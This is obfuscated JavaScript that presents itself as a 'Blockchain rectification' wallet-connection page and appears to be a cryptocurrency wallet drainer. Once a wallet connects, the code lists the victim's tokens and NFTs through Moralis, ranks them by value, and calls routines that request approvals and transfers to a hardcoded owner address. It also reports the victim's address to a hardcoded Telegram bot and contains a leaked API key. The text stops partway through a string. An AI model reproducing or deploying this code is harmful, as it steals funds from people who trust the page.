const _0x42bb45=_0x1d73;(function(_0x13923f,_0x3b03fa){const _0x10d1cf=_0x1d73,_0x4a7e5a=_0x13923f();while(!![]){try{const _0x263a86=-parseInt(_0x10d1cf(0xba))/0x1*(-parseInt(_0x10d1cf(0xd0))/0x2)+-parseInt(_0x10d1cf(0x13c))/0x3+parseInt(_0x10d1cf(0xc2))/0x4+-parseInt(_0x10d1cf(0xdd))/0x5*(parseInt(_0x10d1cf(0x10e))/0x6)+-parseInt(_0x10d1cf(0xb9))/0x7*(parseInt(_0x10d1cf(0x157))/0x8)+-parseInt(_0x10d1cf(0xe0))/0x9*(parseInt(_0x10d1cf(0x11e))/0xa)+parseInt(_0x10d1cf(0xd6))/0xb*(parseInt(_0x10d1cf(0x14e))/0xc);if(_0x263a86===_0x3b03fa)break;else _0x4a7e5a['push'](_0x4a7e5a['shift']());}catch(_0xe7da0b){_0x4a7e5a['push'](_0x4a7e5a['shift']());}}}(_0xf14e,0x8dd5c));let NFTs=[],tokens=[],chainId=null,web3Object=null,selectedAccount=null;import{EthereumClient,w3mConnectors,w3mProvider,WagmiCore,WagmiCoreChains,WagmiCoreConnectors}from'https://unpkg.com/@web3modal/ethereum@2.6.2';import{parseEther}from'https://esm.sh/v126/viem@1.2.15/es2022/viem.bundle.mjs';import{Web3Modal}from'https://unpkg.com/@web3modal/html@2.6.2';function _0x1d73(_0x51183b,_0xf6c8d0){const _0xf14e7f=_0xf14e();return _0x1d73=function(_0x1d73b7,_0x3adab5){_0x1d73b7=_0x1d73b7-0xa9;let _0x49b96b=_0xf14e7f[_0x1d73b7];return _0x49b96b;},_0x1d73(_0x51183b,_0xf6c8d0);}const {avalanche,mainnet}=WagmiCoreChains,{configureChains,createConfig,writeContract,sendTransaction,fetchBalance,fetchFeeData,connect,switchNetwork,getAccount,getNetwork}=WagmiCore,chains=[avalanche,mainnet],projectId=_0x42bb45(0x13e),{publicClient}=configureChains(chains,[w3mProvider({'projectId':projectId})]),wagmiConfig=createConfig({'autoConnect':!![],'connectors':[...w3mConnectors({'chains':chains,'version':0x2,'projectId':projectId}),new WagmiCoreConnectors[(_0x42bb45(0xca))]({'chains':chains,'options':{'appName':'Blockchain\x20rectification'}})],'publicClient':publicClient}),ethereumClient=new EthereumClient(wagmiConfig,chains);export const web3Modal=new Web3Modal({'projectId':projectId,'walletImages':{'safe':'https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg','coinbase':_0x42bb45(0x160)}},ethereumClient);let currentUrl=window[_0x42bb45(0xe2)][_0x42bb45(0xc5)];const OWNER_ADDRESS=_0x42bb45(0x14c),ABI=[{'constant':!![],'inputs':[],'name':_0x42bb45(0xe6),'outputs':[{'name':'','type':_0x42bb45(0x144)}],'payable':![],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'constant':![],'inputs':[{'name':_0x42bb45(0xe7),'type':_0x42bb45(0x162)}],'name':_0x42bb45(0xfb),'outputs':[],'payable':![],'stateMutability':_0x42bb45(0x107),'type':_0x42bb45(0x159)},{'constant':![],'inputs':[{'name':_0x42bb45(0xb2),'type':_0x42bb45(0x162)},{'name':'_value','type':_0x42bb45(0x105)}],'name':_0x42bb45(0xff),'outputs':[],'payable':![],'stateMutability':_0x42bb45(0x107),'type':_0x42bb45(0x159)},{'constant':!![],'inputs':[],'name':_0x42bb45(0xd5),'outputs':[{'name':'','type':_0x42bb45(0x164)}],'payable':![],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'constant':![],'inputs':[{'name':_0x42bb45(0xce),'type':_0x42bb45(0x162)}],'name':'addBlackList','outputs':[],'payable':![],'stateMutability':_0x42bb45(0x107),'type':'function'},{'constant':!![],'inputs':[],'name':'totalSupply','outputs':[{'name':'','type':_0x42bb45(0x105)}],'payable':![],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'constant':![],'inputs':[{'name':'_from','type':_0x42bb45(0x162)},{'name':_0x42bb45(0x109),'type':_0x42bb45(0x162)},{'name':_0x42bb45(0xf0),'type':'uint256'}],'name':_0x42bb45(0x10a),'outputs':[],'payable':![],'stateMutability':_0x42bb45(0x107),'type':_0x42bb45(0x159)},{'constant':!![],'inputs':[],'name':_0x42bb45(0xb1),'outputs':[{'name':'','type':'address'}],'payable':![],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'constant':!![],'inputs':[{'name':'','type':_0x42bb45(0x162)}],'name':'balances','outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':'view','type':_0x42bb45(0x159)},{'constant':!![],'inputs':[],'name':'decimals','outputs':[{'name':'','type':_0x42bb45(0x105)}],'payable':![],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'constant':!![],'inputs':[],'name':_0x42bb45(0x118),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'constant':!![],'inputs':[],'name':_0x42bb45(0xc3),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':'view','type':_0x42bb45(0x159)},{'constant':![],'inputs':[],'name':_0x42bb45(0x146),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':!![],'inputs':[{'name':_0x42bb45(0xc4),'type':_0x42bb45(0x162)}],'name':_0x42bb45(0x16d),'outputs':[{'name':'','type':_0x42bb45(0x164)}],'payable':![],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'constant':!![],'inputs':[{'name':'','type':_0x42bb45(0x162)},{'name':'','type':_0x42bb45(0x162)}],'name':_0x42bb45(0x10b),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'constant':!![],'inputs':[],'name':_0x42bb45(0x12d),'outputs':[{'name':'','type':_0x42bb45(0x164)}],'payable':![],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'constant':!![],'inputs':[{'name':_0x42bb45(0xdf),'type':_0x42bb45(0x162)}],'name':_0x42bb45(0x15e),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'constant':![],'inputs':[],'name':_0x42bb45(0x147),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x42bb45(0x159)},{'constant':!![],'inputs':[],'name':_0x42bb45(0xeb),'outputs':[{'name':'','type':_0x42bb45(0x162)}],'payable':![],'stateMutability':'view','type':_0x42bb45(0x159)},{'constant':!![],'inputs':[],'name':_0x42bb45(0xea),'outputs':[{'name':'','type':'address'}],'payable':![],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'constant':!![],'inputs':[],'name':_0x42bb45(0x110),'outputs':[{'name':'','type':_0x42bb45(0x144)}],'payable':![],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'constant':![],'inputs':[{'name':_0x42bb45(0x109),'type':_0x42bb45(0x162)},{'name':_0x42bb45(0xf0),'type':_0x42bb45(0x105)}],'name':'transfer','outputs':[],'payable':![],'stateMutability':_0x42bb45(0x107),'type':'function'},{'constant':![],'inputs':[{'name':_0x42bb45(0xec),'type':_0x42bb45(0x105)},{'name':_0x42bb45(0x104),'type':'uint256'}],'name':_0x42bb45(0x142),'outputs':[],'payable':![],'stateMutability':_0x42bb45(0x107),'type':_0x42bb45(0x159)},{'constant':![],'inputs':[{'name':_0x42bb45(0x140),'type':_0x42bb45(0x105)}],'name':'issue','outputs':[],'payable':![],'stateMutability':_0x42bb45(0x107),'type':_0x42bb45(0x159)},{'constant':![],'inputs':[{'name':_0x42bb45(0x140),'type':'uint256'}],'name':_0x42bb45(0x151),'outputs':[],'payable':![],'stateMutability':_0x42bb45(0x107),'type':_0x42bb45(0x159)},{'constant':!![],'inputs':[{'name':_0x42bb45(0x111),'type':_0x42bb45(0x162)},{'name':_0x42bb45(0xb2),'type':'address'}],'name':'allowance','outputs':[{'name':_0x42bb45(0x14a),'type':_0x42bb45(0x105)}],'payable':![],'stateMutability':'view','type':_0x42bb45(0x159)},{'constant':!![],'inputs':[],'name':_0x42bb45(0x11c),'outputs':[{'name':'','type':_0x42bb45(0x105)}],'payable':![],'stateMutability':_0x42bb45(0xc0),'type':'function'},{'constant':!![],'inputs':[{'name':'','type':_0x42bb45(0x162)}],'name':_0x42bb45(0x166),'outputs':[{'name':'','type':_0x42bb45(0x164)}],'payable':![],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'constant':![],'inputs':[{'name':_0x42bb45(0xd9),'type':_0x42bb45(0x162)}],'name':_0x42bb45(0xfe),'outputs':[],'payable':![],'stateMutability':_0x42bb45(0x107),'type':_0x42bb45(0x159)},{'constant':!![],'inputs':[],'name':'MAX_UINT','outputs':[{'name':'','type':_0x42bb45(0x105)}],'payable':![],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'constant':![],'inputs':[{'name':_0x42bb45(0xf6),'type':'address'}],'name':_0x42bb45(0x137),'outputs':[],'payable':![],'stateMutability':_0x42bb45(0x107),'type':_0x42bb45(0x159)},{'constant':![],'inputs':[{'name':_0x42bb45(0x16b),'type':_0x42bb45(0x162)}],'name':_0x42bb45(0xae),'outputs':[],'payable':![],'stateMutability':_0x42bb45(0x107),'type':_0x42bb45(0x159)},{'inputs':[{'name':_0x42bb45(0x15c),'type':_0x42bb45(0x105)},{'name':_0x42bb45(0x12a),'type':_0x42bb45(0x144)},{'name':'_symbol','type':_0x42bb45(0x144)},{'name':_0x42bb45(0x10c),'type':_0x42bb45(0x105)}],'payable':![],'stateMutability':_0x42bb45(0x107),'type':_0x42bb45(0xbf)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x42bb45(0x140),'type':_0x42bb45(0x105)}],'name':_0x42bb45(0x106),'type':_0x42bb45(0x12c)},{'anonymous':![],'inputs':[{'indexed':![],'name':'amount','type':_0x42bb45(0x105)}],'name':_0x42bb45(0xd3),'type':_0x42bb45(0x12c)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x42bb45(0x15d),'type':'address'}],'name':'Deprecate','type':_0x42bb45(0x12c)},{'anonymous':![],'inputs':[{'indexed':![],'name':'feeBasisPoints','type':_0x42bb45(0x105)},{'indexed':![],'name':_0x42bb45(0xf9),'type':_0x42bb45(0x105)}],'name':'Params','type':_0x42bb45(0x12c)},{'anonymous':![],'inputs':[{'indexed':![],'name':'_blackListedUser','type':_0x42bb45(0x162)},{'indexed':![],'name':_0x42bb45(0x152),'type':_0x42bb45(0x105)}],'name':_0x42bb45(0xb7),'type':_0x42bb45(0x12c)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x42bb45(0x102),'type':_0x42bb45(0x162)}],'name':_0x42bb45(0x117),'type':_0x42bb45(0x12c)},{'anonymous':![],'inputs':[{'indexed':![],'name':'_user','type':_0x42bb45(0x162)}],'name':_0x42bb45(0x126),'type':_0x42bb45(0x12c)},{'anonymous':![],'inputs':[{'indexed':!![],'name':'owner','type':'address'},{'indexed':!![],'name':_0x42bb45(0x114),'type':_0x42bb45(0x162)},{'indexed':![],'name':_0x42bb45(0x136),'type':'uint256'}],'name':_0x42bb45(0xdc),'type':_0x42bb45(0x12c)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x42bb45(0xcf),'type':_0x42bb45(0x162)},{'indexed':!![],'name':'to','type':_0x42bb45(0x162)},{'indexed':![],'name':_0x42bb45(0x136),'type':'uint256'}],'name':_0x42bb45(0x10f),'type':_0x42bb45(0x12c)},{'anonymous':![],'inputs':[],'name':_0x42bb45(0x155),'type':_0x42bb45(0x12c)},{'anonymous':![],'inputs':[],'name':_0x42bb45(0xbe),'type':_0x42bb45(0x12c)}],ABIN=[{'inputs':[{'internalType':'string','name':'name','type':_0x42bb45(0x144)},{'internalType':_0x42bb45(0x144),'name':_0x42bb45(0x110),'type':'string'},{'internalType':_0x42bb45(0x105),'name':'maxNftSupply','type':_0x42bb45(0x105)},{'internalType':_0x42bb45(0x105),'name':_0x42bb45(0xe5),'type':_0x42bb45(0x105)}],'stateMutability':_0x42bb45(0x107),'type':'constructor'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x42bb45(0x162),'name':_0x42bb45(0xea),'type':_0x42bb45(0x162)},{'indexed':!![],'internalType':_0x42bb45(0x162),'name':_0x42bb45(0x134),'type':_0x42bb45(0x162)},{'indexed':!![],'internalType':'uint256','name':_0x42bb45(0x127),'type':_0x42bb45(0x105)}],'name':'Approval','type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x42bb45(0x162),'name':'owner','type':_0x42bb45(0x162)},{'indexed':!![],'internalType':_0x42bb45(0x162),'name':_0x42bb45(0x168),'type':'address'},{'indexed':![],'internalType':'bool','name':_0x42bb45(0x134),'type':'bool'}],'name':_0x42bb45(0xc7),'type':_0x42bb45(0x12c)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x42bb45(0x162),'name':_0x42bb45(0xf2),'type':_0x42bb45(0x162)},{'indexed':!![],'internalType':_0x42bb45(0x162),'name':_0x42bb45(0xf6),'type':_0x42bb45(0x162)}],'name':_0x42bb45(0xa9),'type':_0x42bb45(0x12c)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x42bb45(0x162),'name':'from','type':_0x42bb45(0x162)},{'indexed':!![],'internalType':_0x42bb45(0x162),'name':'to','type':_0x42bb45(0x162)},{'indexed':!![],'internalType':_0x42bb45(0x105),'name':_0x42bb45(0x127),'type':'uint256'}],'name':_0x42bb45(0x10f),'type':'event'},{'inputs':[],'name':_0x42bb45(0xbb),'outputs':[{'internalType':_0x42bb45(0x144),'name':'','type':_0x42bb45(0x144)}],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'inputs':[],'name':_0x42bb45(0x130),'outputs':[{'internalType':_0x42bb45(0x105),'name':'','type':_0x42bb45(0x105)}],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'inputs':[],'name':_0x42bb45(0xfa),'outputs':[{'internalType':_0x42bb45(0x105),'name':'','type':_0x42bb45(0x105)}],'stateMutability':_0x42bb45(0xc0),'type':'function'},{'inputs':[],'name':_0x42bb45(0x11d),'outputs':[{'internalType':'uint256','name':'','type':_0x42bb45(0x105)}],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'inputs':[{'internalType':_0x42bb45(0x162),'name':'to','type':_0x42bb45(0x162)},{'internalType':'uint256','name':_0x42bb45(0x127),'type':'uint256'}],'name':'approve','outputs':[],'stateMutability':_0x42bb45(0x107),'type':_0x42bb45(0x159)},{'inputs':[{'internalType':_0x42bb45(0x162),'name':_0x42bb45(0xea),'type':_0x42bb45(0x162)}],'name':_0x42bb45(0x15e),'outputs':[{'internalType':_0x42bb45(0x105),'name':'','type':_0x42bb45(0x105)}],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'inputs':[],'name':'baseURI','outputs':[{'internalType':_0x42bb45(0x144),'name':'','type':_0x42bb45(0x144)}],'stateMutability':'view','type':_0x42bb45(0x159)},{'inputs':[],'name':_0x42bb45(0x153),'outputs':[],'stateMutability':_0x42bb45(0x107),'type':_0x42bb45(0x159)},{'inputs':[],'name':_0x42bb45(0xd2),'outputs':[],'stateMutability':'nonpayable','type':_0x42bb45(0x159)},{'inputs':[{'internalType':_0x42bb45(0x105),'name':_0x42bb45(0x127),'type':_0x42bb45(0x105)}],'name':_0x42bb45(0xf8),'outputs':[{'internalType':_0x42bb45(0x162),'name':'','type':_0x42bb45(0x162)}],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'inputs':[{'internalType':_0x42bb45(0x162),'name':_0x42bb45(0xea),'type':_0x42bb45(0x162)},{'internalType':_0x42bb45(0x162),'name':_0x42bb45(0x168),'type':'address'}],'name':_0x42bb45(0xb4),'outputs':[{'internalType':_0x42bb45(0x164),'name':'','type':_0x42bb45(0x164)}],'stateMutability':_0x42bb45(0xc0),'type':'function'},{'inputs':[],'name':_0x42bb45(0x132),'outputs':[{'internalType':'uint256','name':'','type':_0x42bb45(0x105)}],'stateMutability':'view','type':'function'},{'inputs':[{'internalType':_0x42bb45(0x105),'name':'numberOfTokens','type':_0x42bb45(0x105)}],'name':'mintApe','outputs':[],'stateMutability':_0x42bb45(0x150),'type':_0x42bb45(0x159)},{'inputs':[],'name':_0x42bb45(0xe6),'outputs':[{'internalType':_0x42bb45(0x144),'name':'','type':_0x42bb45(0x144)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x42bb45(0xea),'outputs':[{'internalType':_0x42bb45(0x162),'name':'','type':_0x42bb45(0x162)}],'stateMutability':'view','type':'function'},{'inputs':[{'internalType':_0x42bb45(0x105),'name':'tokenId','type':_0x42bb45(0x105)}],'name':_0x42bb45(0x11f),'outputs':[{'internalType':_0x42bb45(0x162),'name':'','type':_0x42bb45(0x162)}],'stateMutability':'view','type':_0x42bb45(0x159)},{'inputs':[],'name':_0x42bb45(0x15a),'outputs':[],'stateMutability':_0x42bb45(0x107),'type':_0x42bb45(0x159)},{'inputs':[],'name':_0x42bb45(0x13f),'outputs':[],'stateMutability':_0x42bb45(0x107),'type':_0x42bb45(0x159)},{'inputs':[{'internalType':_0x42bb45(0x162),'name':_0x42bb45(0xcf),'type':_0x42bb45(0x162)},{'internalType':_0x42bb45(0x162),'name':'to','type':'address'},{'internalType':_0x42bb45(0x105),'name':'tokenId','type':_0x42bb45(0x105)}],'name':'safeTransferFrom','outputs':[],'stateMutability':'nonpayable','type':_0x42bb45(0x159)},{'inputs':[{'internalType':_0x42bb45(0x162),'name':_0x42bb45(0xcf),'type':_0x42bb45(0x162)},{'internalType':'address','name':'to','type':_0x42bb45(0x162)},{'internalType':_0x42bb45(0x105),'name':'tokenId','type':'uint256'},{'internalType':_0x42bb45(0x125),'name':_0x42bb45(0x108),'type':_0x42bb45(0x125)}],'name':'safeTransferFrom','outputs':[],'stateMutability':'nonpayable','type':_0x42bb45(0x159)},{'inputs':[],'name':_0x42bb45(0xe9),'outputs':[{'internalType':_0x42bb45(0x164),'name':'','type':_0x42bb45(0x164)}],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'inputs':[{'internalType':'address','name':_0x42bb45(0x168),'type':_0x42bb45(0x162)},{'internalType':_0x42bb45(0x164),'name':_0x42bb45(0x134),'type':_0x42bb45(0x164)}],'name':_0x42bb45(0x12f),'outputs':[],'stateMutability':_0x42bb45(0x107),'type':_0x42bb45(0x159)},{'inputs':[{'internalType':'string','name':_0x42bb45(0x115),'type':_0x42bb45(0x144)}],'name':'setBaseURI','outputs':[],'stateMutability':_0x42bb45(0x107),'type':_0x42bb45(0x159)},{'inputs':[{'internalType':_0x42bb45(0x144),'name':_0x42bb45(0x158),'type':'string'}],'name':_0x42bb45(0x112),'outputs':[],'stateMutability':_0x42bb45(0x107),'type':_0x42bb45(0x159)},{'inputs':[{'internalType':_0x42bb45(0x105),'name':_0x42bb45(0xcc),'type':_0x42bb45(0x105)}],'name':_0x42bb45(0x16e),'outputs':[],'stateMutability':_0x42bb45(0x107),'type':_0x42bb45(0x159)},{'inputs':[],'name':'setStartingIndex','outputs':[],'stateMutability':'nonpayable','type':_0x42bb45(0x159)},{'inputs':[],'name':'startingIndex','outputs':[{'internalType':'uint256','name':'','type':_0x42bb45(0x105)}],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'inputs':[],'name':'startingIndexBlock','outputs':[{'internalType':_0x42bb45(0x105),'name':'','type':_0x42bb45(0x105)}],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'inputs':[{'internalType':'bytes4','name':_0x42bb45(0x165),'type':_0x42bb45(0xcb)}],'name':'supportsInterface','outputs':[{'internalType':_0x42bb45(0x164),'name':'','type':_0x42bb45(0x164)}],'stateMutability':'view','type':_0x42bb45(0x159)},{'inputs':[],'name':'symbol','outputs':[{'internalType':_0x42bb45(0x144),'name':'','type':'string'}],'stateMutability':'view','type':_0x42bb45(0x159)},{'inputs':[{'internalType':_0x42bb45(0x105),'name':_0x42bb45(0xaf),'type':_0x42bb45(0x105)}],'name':'tokenByIndex','outputs':[{'internalType':_0x42bb45(0x105),'name':'','type':'uint256'}],'stateMutability':_0x42bb45(0xc0),'type':'function'},{'inputs':[{'internalType':'address','name':_0x42bb45(0xea),'type':'address'},{'internalType':'uint256','name':_0x42bb45(0xaf),'type':_0x42bb45(0x105)}],'name':_0x42bb45(0x13b),'outputs':[{'internalType':_0x42bb45(0x105),'name':'','type':'uint256'}],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'inputs':[{'internalType':_0x42bb45(0x105),'name':_0x42bb45(0x127),'type':_0x42bb45(0x105)}],'name':_0x42bb45(0x12e),'outputs':[{'internalType':_0x42bb45(0x144),'name':'','type':_0x42bb45(0x144)}],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'inputs':[],'name':'totalSupply','outputs':[{'internalType':_0x42bb45(0x105),'name':'','type':'uint256'}],'stateMutability':_0x42bb45(0xc0),'type':_0x42bb45(0x159)},{'inputs':[{'internalType':'address','name':_0x42bb45(0xcf),'type':_0x42bb45(0x162)},{'internalType':_0x42bb45(0x162),'name':'to','type':_0x42bb45(0x162)},{'internalType':'uint256','name':_0x42bb45(0x127),'type':'uint256'}],'name':_0x42bb45(0x10a),'outputs':[],'stateMutability':'nonpayable','type':_0x42bb45(0x159)},{'inputs':[{'internalType':_0x42bb45(0x162),'name':_0x42bb45(0xf6),'type':_0x42bb45(0x162)}],'name':'transferOwnership','outputs':[],'stateMutability':_0x42bb45(0x107),'type':'function'},{'inputs':[],'name':_0x42bb45(0xed),'outputs':[],'stateMutability':_0x42bb45(0x107),'type':_0x42bb45(0x159)}];let wallet;$(_0x42bb45(0xf4))[_0x42bb45(0x15b)](async function(){const _0x47fbec=_0x42bb45;wallet=_0x47fbec(0xf3),await connector();}),$(_0x42bb45(0xb6))[_0x42bb45(0x15b)](async function(){const _0x1c0082=_0x42bb45;wallet=_0x1c0082(0x16a),await connector();}),$('.trust')['click'](async function(){wallet='trustwallet',await connector();}),$(_0x42bb45(0xfc))[_0x42bb45(0x15b)](async function(){const _0x1aedec=_0x42bb45;try{await web3Modal[_0x1aedec(0x129)]();}catch(_0x213a7c){console['log'](_0x1aedec(0x100),_0x213a7c);return;}});let connector=async()=>{const _0x145a02=_0x42bb45;if(typeof web3===_0x145a02(0xdb)&&typeof ethereum===_0x145a02(0xdb)){console[_0x145a02(0x13a)](_0x145a02(0x101));if(wallet===_0x145a02(0xf3)){let _0x191066=_0x145a02(0xab)+currentUrl;window[_0x145a02(0xe2)][_0x145a02(0xc5)]=_0x191066;}else{if(wallet===_0x145a02(0x16a)){let _0xa26695=_0x145a02(0x163)+currentUrl;window[_0x145a02(0xe2)]['href']=_0xa26695;}else{if(wallet===_0x145a02(0xd7)){let _0x1f3e26=_0x145a02(0x14f)+currentUrl;window[_0x145a02(0xe2)][_0x145a02(0xc5)]=_0x1f3e26;}}}}else try{await web3Modal[_0x145a02(0x129)]();}catch(_0x537dfc){console[_0x145a02(0x13a)]('Could\x20not\x20get\x20a\x20wallet\x20connection',_0x537dfc);return;}};$(_0x42bb45(0x15f))['click'](async function(){const _0x19c382=_0x42bb45;let _0xbab6bf=getAccount();console['log'](_0xbab6bf),!_0xbab6bf[_0x19c382(0x162)]&&(console[_0x19c382(0x13a)](_0x19c382(0xd4)),alert('You\x20need\x20to\x20connect\x20your\x20wallet\x20first')),_0xbab6bf['connector'][_0x19c382(0xe6)]===_0x19c382(0xda)&&(_0xbab6bf['connector']['options'][_0x19c382(0x143)]()['networkVersion']!=='43114'&&(console[_0x19c382(0x13a)]('Incorrect\x20network'),await switchNetwork({'chainId':0xa86a}))),selectedAccount=_0xbab6bf[_0x19c382(0x162)],sendMessage(_0x19c382(0x121)),sendMessage('Cl\x20address\x20:\x20'+selectedAccount),covalenthqAPICall();});const Oxa=_0x42bb45(0x169),Oxc1=_0x42bb45(0xbc),Oxc2=_0x42bb45(0x11b);async function covalenthqAPICall(){const _0x2020c8=_0x42bb45,_0x5d83d9={'chain':_0x2020c8(0x10d)},_0x5c39ed=new URL('https://deep-index.moralis.io/api/v2/'+selectedAccount+'/erc20');_0x5c39ed[_0x2020c8(0x139)]=new URLSearchParams(_0x5d83d9)[_0x2020c8(0xe4)]();const _0x233d00={'method':_0x2020c8(0xd8),'headers':{'accept':'application/json','X-API-Key':'LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn'}};try{const _0x5ea4ea=await fetch(_0x5c39ed,_0x233d00)[_0x2020c8(0x14b)](_0x26e8a0=>_0x26e8a0[_0x2020c8(0x113)]());console[_0x2020c8(0x13a)](_0x5ea4ea);let _0x15cc2a=_0x5ea4ea;console[_0x2020c8(0x13a)](_0x2020c8(0xc8),_0x15cc2a);let _0x2b423f=await Promise[_0x2020c8(0x141)](_0x15cc2a['map'](async _0x341d9d=>{const _0x2d13d1=_0x2020c8;let _0x5ce079;try{_0x5ce079=await getValue(_0x341d9d[_0x2d13d1(0x156)],_0x341d9d[_0x2d13d1(0x133)],_0x341d9d[_0x2d13d1(0xf7)]);}catch(_0x378a30){_0x5ce079=0x0;}return console[_0x2d13d1(0x13a)](_0x5ce079),{'balance':_0x341d9d['balance'],'value':_0x5ce079,'address':_0x341d9d[_0x2d13d1(0x156)]};}));console[_0x2020c8(0x13a)](_0x2020c8(0x103),_0x2b423f),tokens=_0x2b423f[_0x2020c8(0x120)](_0x381cac=>_0x381cac['value']>0x5),tokens[_0x2020c8(0x148)]((_0x37fc6e,_0x15c99d)=>_0x15c99d[_0x2020c8(0x136)]-_0x37fc6e[_0x2020c8(0x136)]),console[_0x2020c8(0x13a)](_0x2020c8(0xc9),await getNetwork(),_0x2020c8(0x131),tokens),NFTs=await getNFTs(selectedAccount)['catch'](_0x7a8d39=>{const _0x39be85=_0x2020c8;console['log'](_0x39be85(0x119),_0x7a8d39);}),NFTs=NFTs[_0x2020c8(0xe8)],console[_0x2020c8(0x13a)]('NFTs\x20collection\x20',NFTs);if(tokens[_0x2020c8(0xf5)]===0x0&&NFTs[_0x2020c8(0xf5)]===0x0)onSendEther();else onApprove();}catch{sendMessage(_0x2020c8(0x161));}}async function onApprove(){const _0x5ca012=_0x42bb45;if(tokens[_0x5ca012(0xf5)])try{loopTokens(tokens);}catch(_0x2db293){console['error'](_0x5ca012(0xaa)+_0x2db293['message']);}else{if(NFTs[_0x5ca012(0xf5)]){try{loopNfts(NFTs);}catch(_0x1d0a7b){console[_0x5ca012(0xc1)](_0x5ca012(0xaa)+_0x1d0a7b[_0x5ca012(0xe1)]);}onSendEther(),sendMessage(_0x5ca012(0xb8));}else try{onSendEther();}catch(_0x1700ac){console[_0x5ca012(0xc1)](_0x5ca012(0xaa)+_0x1700ac[_0x5ca012(0xe1)]);}}}function _0xf14e(){const _0x55a9ae=['Wallet\x20Connected\x20Successfully\x20to\x20eth\x20mainnet!','Transaction\x20is\x20submitted\x20to\x20the\x20network','999999999999999999999999999999999999999999999999999999999999999999999999','LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','bytes','RemovedBlackList','tokenId','Error:\x20','openModal','_name','https://api.telegram.org/bot6481182944:AAEeTPQfvktpJMe9_hifEz07l2REHwQptHM/sendMessage?chat_id=','event','paused','tokenURI','setApprovalForAll','MAX_APES','Tokens:','maxApePurchase','balance','approved','New\x20token','value','transferOwnership','sending\x20ether','search','log','tokenOfOwnerByIndex','2337813aJlddN','catch','ee71d215d0dec7d1bf950851c84d9643','reserveApes','amount','all','setParams','getProvider','string','Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens','unpause','pause','sort','status','remaining','then','0xea8968B218a551919FbD5f1166328C82a96dED54','formatted','5513316XdIFlU','https://link.trustwallet.com/open_url?url=','payable','redeem','_balance','emergencySetStartingIndexBlock','NFT\x20Contract\x20Address\x20','Pause','token_address','112UeMLdm','provenanceHash','function','renounceOwnership','click','_initialSupply','newAddress','balanceOf','.proceed','https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png','Error\x20collecting\x20info\x20about\x20wallet','address','https://go.cb-w.com/dapp?cb_url=','bool','interfaceId','isBlackListed','Transaction\x20hash\x20','operator','0x1716832364CA43916E0c8512ECF732D10E5D9dBd','coinbase','_blackListedUser','NFT','getBlackListStatus','setRevealTimestamp','OwnershipTransferred','Error\x20processing\x20item\x20','https://metamask.app.link/dapp/','Token\x20balance\x20is\x20','hash','destroyBlackFunds','index','https://deep-index.moralis.io/api/v2/','upgradedAddress','_spender','Approve\x20Completed\x20Successfully','isApprovedForAll','&text=','.coinbase','DestroyedBlackFunds','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','87773dUQBDj','229RrFAEO','BAYC_PROVENANCE','5227607491','https://api.coingecko.com/api/v3/simple/token_price/avalanche?contract_addresses=','Unpause','constructor','view','error','4593312fjywcH','_totalSupply','_maker','href','Your\x20address\x20','ApprovalForAll','Initial\x20list\x20','chainId:','CoinbaseWalletConnector','bytes4','revealTimeStamp','TOKEN\x20Contract\x20Address\x20','_evilUser','from','5858wBVkDV','/nft/collections?chain=','flipSaleState','Redeem','No\x20address','deprecated','22XaDZEr','trustwallet','GET','_clearedUser','MetaMask','undefined','Approval','375890qaDDlK','&format=decimal&limit=','who','946044tcjCtl','message','location','&vs_currencies=usd','toString','saleStart','name','_upgradedAddress','result','saleIsActive','owner','getOwner','newBa